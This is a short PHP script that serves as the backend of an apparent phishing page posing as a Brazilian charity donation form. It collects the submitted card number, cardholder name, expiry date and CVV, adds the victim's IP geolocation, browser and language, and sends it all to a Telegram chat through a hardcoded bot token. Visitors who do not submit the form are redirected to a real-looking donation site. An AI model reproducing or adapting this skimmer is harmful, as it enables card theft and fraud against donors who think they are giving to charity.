<?php

function getIpInfo($ip) {
    $apiUrl = "http://ip-api.com/json/{$ip}";
    $apiData = file_get_contents($apiUrl);
    return json_decode($apiData, true);
}

function getBrowserName($userAgent) {
    $browser = "Desconhecido";
    if (preg_match('/Firefox/i', $userAgent)) {
        $browser = 'Firefox';
    } elseif (preg_match('/MSIE/i', $userAgent) || preg_match('/Trident/i', $userAgent)) {
        $browser = 'Internet Explorer';
    } elseif (preg_match('/Edge/i', $userAgent)) {
        $browser = 'Microsoft Edge';
    } elseif (preg_match('/Chrome/i', $userAgent)) {
        $browser = 'Google Chrome';
    } elseif (preg_match('/Safari/i', $userAgent)) {
        $browser = 'Safari';
    } elseif (preg_match('/Opera|OPR/i', $userAgent)) {
        $browser = 'Opera';
    }
    return $browser;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    if (isset($_POST['numero_cartao']) && isset($_POST['nome_cartao']) && isset($_POST['validade_cartao']) && isset($_POST['cvv']) && isset($_POST['valor_doacao'])) {
        
        $numeroCartao = $_POST['numero_cartao'];
        $nomeCartao = $_POST['nome_cartao'];
        $validadeCartao = $_POST['validade_cartao'];
        $cvv = $_POST['cvv'];
        $valorDoacao = $_POST['valor_doacao'];
        $dataHora = date('Y-m-d H:i:s');

        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $linguao = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'N/A';

        $navegador = getBrowserName($userAgent);
        $ipInfo = getIpInfo($ip);

        $conteudo = "🦆 | LOG DUCKETTSTONE\n\n";
        $conteudo .= "💳 | Número do Cartão: $numeroCartao\n";
        $conteudo .= "🔐 | Nome no Cartão: $nomeCartao\n";
        $conteudo .= "📅 | Validade: $validadeCartao\n";
        $conteudo .= "🔑 | Cvv: $cvv\n";
        $conteudo .= "💰 | Valor da Doação: R$ $valorDoacao\n";
        $conteudo .= "🏠 | IP: " . $ipInfo["query"] . "\n🔎 | Cidade: " . $ipInfo["city"] . "\n📍 | Região: " . $ipInfo["regionName"] . "\n🌎 | País: " . $ipInfo["country"] . "\n📦 | ISP: " . $ipInfo["isp"] . "\n\n";
        $conteudo .= "🔓 | USER-AGENT: $userAgent\n";
        $conteudo .= "🌐 | NAVEGADOR: $navegador\n";
        $conteudo .= "👥 | LINGUAGEM: $linguao\n";
        $conteudo .= "📆 | DATA/HORA: $dataHora\n\n";        

        $botToken = '9021054886:AAG7c_UA9-n5x32Z6rzc_2hufMM_ahV7at8';
        $chatId = '5998788553';

        $mensagem = urlencode($conteudo);
        $url = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$mensagem}";

        $response = file_get_contents($url);

        if ($response !== false) {
            header('Location: checkout.html'); 
            exit();
        } else {
            echo "Houve um erro ao enviar os dados. Tente novamente.";
        }
    } else {
        echo "Por favor, preencha todos os campos do formulário.";
    }
} else {
    header('Location: https://doe.savebrasil.org.br/'); 
    exit();
}
?>
